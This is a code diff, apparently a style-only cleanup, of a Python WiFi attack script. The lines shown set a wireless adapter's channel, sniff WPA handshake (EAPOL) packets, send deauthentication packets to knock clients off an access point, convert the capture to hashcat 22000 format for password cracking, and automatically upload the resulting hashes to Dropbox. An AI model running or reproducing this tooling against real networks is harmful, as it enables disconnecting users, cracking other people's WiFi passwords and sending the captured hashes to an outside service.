@@ -38,7 +38,8 @@ def check_args():
     parser.add_argument('-d', '--deauth', help='Number of Deauth packets to send, Default: 1', type=int, default='1',
                         dest='deauth_count')
     parser.add_argument('-p', '--pcap',
-                        help='PCAP file to save EAPOL Packets Automatically Appended Current Time, Default: sniffed_date.pcap',
+                        help='PCAP file to save EAPOL Packets Automatically Appended Current Time, Default: '
+                             'sniffed_date.pcap',
                         default='sniffed.pcap', dest='pcap_file')
     results = parser.parse_args()
     return results.iface, results.ap, results.client, results.channel, results.deauth_count, results.pcap_file
@@ -55,8 +56,10 @@ def packethandler(pkt):
         if pkt.haslayer(EAPOL) or (pkt.type == 0 and pkt.addr3 == ap.lower()):
             pktdump.write(pkt)
             if pkt.haslayer(EAPOL):
-                print(f"{bcolors.OKGREEN}Captured EAPOL Packet from SRC: %s and DST: %s{bcolors.ENDC}" % (pkt.addr2, pkt.addr1))
+                print(f"{bcolors.OKGREEN}Captured EAPOL Packet from SRC: %s and DST: %s{bcolors.ENDC}"
+                      % (pkt.addr2, pkt.addr1))
                 packet_list.append(pkt)
+
 
 def cap_converter():
     print('\n''Converting to hashcat 22000 format..''\n')
@@ -85,7 +88,7 @@ def dropbox_uploader():
                     dest_path = os.path.join('/', file)
                     if os.stat(file_path).st_size != 0:
                         print('Uploading %s to %s' % (file_path, dest_path))
-                        with open(file_path,'rb') as f:
+                        with open(file_path, 'rb') as f:
                             dbx.files_upload(f.read(), dest_path, mute=True)
                 except Exception as err:
                     print("Failed to upload %s\n%s" % (file, err))
@@ -96,14 +99,14 @@ def dropbox_uploader():
 if __name__ == '__main__':
     iface, ap, client, channel, deauth_count, pcap_file = check_args()
     pcap_file = os.path.splitext(pcap_file)[0] + '_' + datetime.now().strftime("%Y_%m_%d-%H-%M-%S") + '.pcap'
-    os.system('iwconfig %s channel %s' % (iface, channel)) # Set WiFi Adapter On right Channel
-    t = threading.Thread(target=sniffer) # Start Sniffing in backgroud.
+    os.system('iwconfig %s channel %s' % (iface, channel))  # Set WiFi Adapter On right Channel
+    t = threading.Thread(target=sniffer)  # Start Sniffing in backgroud.
     t.start()
-    time.sleep(2) # Wait 2 seconds for sniffing to start.
+    time.sleep(2)  # Wait 2 seconds for sniffing to start.
     send_deauth_packet()
     print(f"{bcolors.OKBLUE}Sent %s Deauth Packet(s){bcolors.ENDC}" % deauth_count)
     t.join()
-    print(f"{bcolors.WARNING}Captured Total %s EAPOL Packets{bcolors.ENDC}" %(len(packet_list)), '\n')
-    print('Packets Written to: %s' %(os.getcwd()+'/'+pcap_file))
-    cap_converter() # Function that converts pcap to hashcat 22000 mode.
-    dropbox_uploader() #Automatic hash uploader
+    print(f"{bcolors.WARNING}Captured Total %s EAPOL Packets{bcolors.ENDC}" % (len(packet_list)), '\n')
+    print('Packets Written to: %s' % (os.getcwd()+'/'+pcap_file))
+    cap_converter()  # Function that converts pcap to hashcat 22000 mode.
+    dropbox_uploader()  # Automatic hash uploader
